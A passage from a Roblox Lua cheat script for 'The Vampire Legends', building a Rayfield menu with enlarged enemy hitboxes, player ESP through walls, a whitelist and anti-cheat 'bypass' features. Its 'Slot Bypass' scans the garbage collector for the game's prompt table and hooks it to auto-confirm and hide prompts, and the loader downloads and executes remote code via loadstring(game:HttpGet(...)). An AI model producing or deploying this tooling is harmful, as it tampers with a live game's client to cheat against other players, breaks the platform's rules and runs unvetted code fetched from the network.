				end
			end
			for _, body in ipairs(toRemove) do removeBodyESP(body) end
		end
	end

	Players.PlayerAdded:Connect(function(player)
		player.CharacterAdded:Connect(function()
			task.wait(0.5)
			if not ESP_CACHE[player] and not isInLobby(player) then
				createESP(player)
			end
		end)
		if player.Character then
			task.wait(0.5)
			if not ESP_CACHE[player] and not isInLobby(player) then
				createESP(player)
			end
		end
	end)

	Players.PlayerRemoving:Connect(removeESP)

	enableESPAll()

	-- Varredura Periódica
	task.spawn(function()
		while true do
			task.wait(0.25)
			pcall(function()
				if not espEnabled then
					clearAllESP()
					return
				end

				local currentBodies, freyaAstralBodies = scanForPhysicalBodies()

				-- Cria ESP para corpos normais (projecao astral, etc.)
				for body in pairs(currentBodies) do
					if not BODY_CACHE[body] then
						createBodyESP(body, false, false)
					end
				end

				-- Cria ESP para corpos astrais da Freya
				for body in pairs(freyaAstralBodies) do
					if showFreyaBody and not BODY_CACHE[body] then
						createBodyESP(body, false, true)
					end
				end

				-- Se algum jogador que saiu do lobby ou entrou no jogo precisa de inicializacao de ESP
				for _, player in ipairs(Players:GetPlayers()) do
					if player ~= LocalPlayer and not isInLobby(player) and not ESP_CACHE[player] then
						createESP(player)
					end
				end

				-- Cleanup: remove body ESP apenas se o modelo saiu do jogo inteiramente
				for body in pairs(BODY_CACHE) do
					if not body:IsDescendantOf(game) then
						removeBodyESP(body)
					end
				end
			end)
		end
	end)

	return ESPControl
end)()

-- ==================== RAYFIELD LOADER ====================

local function customizeRayfieldIntro()
	task.spawn(function()
		local rayfieldGui = nil
		for i = 1, 100 do
			if gethui then
				rayfieldGui = gethui():FindFirstChild("Rayfield")
			end
			if not rayfieldGui then
				rayfieldGui = CoreGui:FindFirstChild("Rayfield")
			end
			if rayfieldGui then
				break
			end
			task.wait(0.05)
		end

		if not rayfieldGui then return end

		local main = rayfieldGui:FindFirstChild("Main")
		if not main then return end

		local loadingFrame = main:FindFirstChild("LoadingFrame")
		if not loadingFrame then return end

		local title = loadingFrame:FindFirstChild("Title")
		local subtitle = loadingFrame:FindFirstChild("Subtitle")
		local version = loadingFrame:FindFirstChild("Version")

		if title then title.Visible = false end
		if subtitle then subtitle.Visible = false end
		if version then version.Visible = false end

		local diarianLogo = loadingFrame:FindFirstChild("DiarianLogo")
		if not diarianLogo then
			diarianLogo = Instance.new("Frame")
			diarianLogo.Name = "DiarianLogo"
			diarianLogo.BackgroundTransparency = 1
			diarianLogo.Size = UDim2.new(0, 240, 0, 70)
			diarianLogo.Position = UDim2.new(0.5, 0, 0.5, 0)
			diarianLogo.AnchorPoint = Vector2.new(0.5, 0.5)
			diarianLogo.Parent = loadingFrame

			local logo = Instance.new("ImageLabel")
			logo.BackgroundTransparency = 1
			logo.Size = UDim2.new(0, 60, 0, 60)
			logo.Position = UDim2.new(0, 0, 0.5, 0)
			logo.AnchorPoint = Vector2.new(0, 0.5)
			logo.Image = "rbxassetid://94733361910796"
			logo.Parent = diarianLogo

			local label = Instance.new("TextLabel")
			label.BackgroundTransparency = 1
			label.Size = UDim2.new(0, 170, 0, 60)
			label.Position = UDim2.new(0, 70, 0.5, 0)
			label.AnchorPoint = Vector2.new(0, 0.5)
			label.Text = "DIARIAN"
			label.TextColor3 = Color3.fromRGB(255, 255, 255)
			label.TextSize = 34
			label.FontFace = Font.new("rbxassetid://12187377099", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
			label.TextXAlignment = Enum.TextXAlignment.Left
			label.Parent = diarianLogo

			logo.ImageTransparency = 1
			label.TextTransparency = 1

			local TweenService = game:GetService("TweenService")
			TweenService:Create(logo, TweenInfo.new(0.7, Enum.EasingStyle.Exponential), { ImageTransparency = 0 }):Play()
			TweenService:Create(label, TweenInfo.new(0.7, Enum.EasingStyle.Exponential), { TextTransparency = 0 }):Play()
			TweenService:Create(diarianLogo, TweenInfo.new(0.7, Enum.EasingStyle.Exponential),
				{ Size = UDim2.new(0, 240, 0, 70) }):Play()

			task.spawn(function()
				while loadingFrame.Visible do
					task.wait()
				end
				TweenService:Create(logo, TweenInfo.new(0.2, Enum.EasingStyle.Exponential), { ImageTransparency = 1 })
					:Play()
				TweenService:Create(label, TweenInfo.new(0.2, Enum.EasingStyle.Exponential), { TextTransparency = 1 })
					:Play()
			end)
		end
	end)
end

-- Pula a tela de loading do Rayfield
if getgenv then getgenv().rayfieldCached = true end

local Rayfield
local localSuccess, localErr = pcall(function()
	Rayfield = loadstring(readfile("rayf/source"))()
end)
if not localSuccess or not Rayfield then
	Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
end

customizeRayfieldIntro()

local Window = Rayfield:CreateWindow({
	Name = "The Vampire Legends",
	Theme = "DarkBlue",
	Icon = 94733361910796,
	DisableRayfieldPrompts = true,
	DisableBuildWarnings = true,
	ConfigurationSaving = {
		Enabled = true,
		FolderName = "diarian_rayfield",
		FileName = "config",
	},
	Discord = {
		Enabled = false,
	},
	KeySystem = false,
})

local HitboxTab = Window:CreateTab("Hitbox", "crosshair")
local VisualsTab = Window:CreateTab("Visuals", "eye")
local WhitelistTab = Window:CreateTab("Whitelist", "shield")
local MiscTab = Window:CreateTab("Misc", "settings")

HitboxTab:CreateSection("Hitbox")

hitboxToggleRef = HitboxTab:CreateToggle({
	Name = "Ativar Hitbox",
	CurrentValue = hitboxEnabled,
	Callback = function(state)
		setHitboxEnabled(state)
	end,
})

HitboxTab:CreateKeybind({
	Name = "Hitbox Keybind",
	CurrentKeybind = "Four",
	HoldToInteract = false,
	Callback = function()
		hitboxToggleRef:Set(not hitboxEnabled)
	end,
})

HitboxTab:CreateSlider({
	Name = "Tamanho da Box",
	Range = { 10, 65 },
	Increment = 1,
	CurrentValue = 50,
	Callback = function(value)
		hitboxSize = value
		refreshAllHitboxes()
	end,
})

HitboxTab:CreateSlider({
	Name = "Transparência da Box",
	Range = { 0, 100 },
	Increment = 1,
	CurrentValue = 80,
	Callback = function(value)
		hitboxTransparency = value
		refreshAllHitboxes()
	end,
})

HitboxTab:CreateColorPicker({
	Name = "Cor da Hitbox",
	Color = Color3.fromRGB(180, 150, 255),
	Callback = function(color)
		hitboxColor = color
		refreshAllHitboxes()
	end,
})

-- ==================== WHITELIST TAB ====================

WhitelistTab:CreateSection("Whitelist de Hitbox")
WhitelistTab:CreateParagraph({
	Title = "Como usar",
	Content = "Jogadores na whitelist não são marcados com hitbox.",
})

local function setWhitelistPlayer(playerName, state)
	if not playerName or playerName == LocalPlayer.Name then
		return
	end

	if state then
		friendWhitelist[playerName] = true
		if EntitiesFolder then
			local entity = EntitiesFolder:FindFirstChild(playerName)
			if entity and entity:IsA("Model") then
				destroyHitboxForModel(entity)
			end
		end
	else
		friendWhitelist[playerName] = nil
		if hitboxEnabled and EntitiesFolder then
			local entity = EntitiesFolder:FindFirstChild(playerName)
			if entity and entity:IsA("Model") then
				createHitboxForModel(entity)
			end
		end
	end
end

local function addWhitelistToggleForPlayer(player)
	if not player or player == LocalPlayer then
		return
	end
	if whitelistToggles[player.Name] then
		return
	end

	whitelistToggles[player.Name] = WhitelistTab:CreateToggle({
		Name = "Ignorar " .. player.Name,
		CurrentValue = friendWhitelist[player.Name] == true,
		Callback = function(state)
			setWhitelistPlayer(player.Name, state)
		end,
	})
end

for _, player in ipairs(Players:GetPlayers()) do
	if player ~= LocalPlayer then
		addWhitelistToggleForPlayer(player)
	end
end

Players.PlayerAdded:Connect(function(player)
	addWhitelistToggleForPlayer(player)
end)

Players.PlayerRemoving:Connect(function(player)
	whitelistToggles[player.Name] = nil
end)

VisualsTab:CreateSection("ESP")

VisualsTab:CreateToggle({
	Name = "Ativar ESP",
	CurrentValue = false,
	Callback = function(state)
		ESPControl:setEnabled(state)
	end,
})


VisualsTab:CreateSlider({
	Name = "ESP Range",
	Range = { 100, 1500 },
	Increment = 50,
	CurrentValue = 900,
	Callback = function(value)
		ESPControl:setRange(value)
	end,
})

MiscTab:CreateSection("Bypass Status")
MiscTab:CreateParagraph({
	Title = "Autoclicker Bypass",
	Content = autoclickBypassStatus
})

MiscTab:CreateSection("Configurações")


MiscTab:CreateButton({
	Name = "Ativar FPS Booster",
	Callback = function()
		activateFPSBooster()
		Rayfield:Notify({
			Title = "FPS Booster",
			Content = "Otimizações aplicadas!",
			Duration = 3,
			Image = 94733361910796,
		})
	end,
})

local slotBypassEnabled = false
local slotBypassActive = false

MiscTab:CreateToggle({
	Name = "Slot Bypass",
	CurrentValue = false,
	Callback = function(state)
		slotBypassEnabled = state
		if state and not slotBypassActive then
			slotBypassActive = true
			pcall(function()
				local v_u_1 = nil
				for _, v in pairs(getgc(true)) do
					if type(v) == "table" and rawget(v, "enablePrompt") then
						v_u_1 = v
						break
					end
				end
				if v_u_1 then
					local originalEnable = v_u_1.enablePrompt
					v_u_1.enablePrompt = function(texto, confirmar, recusar)
						if not slotBypassEnabled then
							return originalEnable(texto, confirmar, recusar)
						end
						if confirmar then confirmar() end
						v_u_1.promptVisible:set(false)
					end
					local oldSet = v_u_1.promptVisible.set
					v_u_1.promptVisible.set = function(self, value)
						if slotBypassEnabled and value == true then
							return oldSet(self, false)
						end
						return oldSet(self, value)
					end
				end
			end)
		end
	end,
})


-- ==================== CORE HANDLERS ====================

if EntitiesFolder then
	EntitiesFolder.ChildAdded:Connect(function(entity)
		if hitboxEnabled and entity:IsA("Model") then
			createHitboxForModel(entity)
		end
	end)

	EntitiesFolder.ChildRemoved:Connect(function(entity)
		destroyHitboxForModel(entity)
	end)
end

workspace.ChildAdded:Connect(function(child)
	if child.Name == "Entities" and child:IsA("Folder") then
		EntitiesFolder = child
		if hitboxEnabled then
			for _, entity in ipairs(EntitiesFolder:GetChildren()) do
				if entity:IsA("Model") then
					createHitboxForModel(entity)
				end
			end
		end
	end
end)

task.spawn(function()
	while true do
		if hitboxEnabled and EntitiesFolder then
			for _, entity in ipairs(EntitiesFolder:GetChildren()) do
				if entity:IsA("Model") and not hitboxBoxes[entity] and not shouldIgnoreHitboxName(entity.Name) then
					createHitboxForModel(entity)
				end
			end
		end
		task.wait(1)
	end
end)
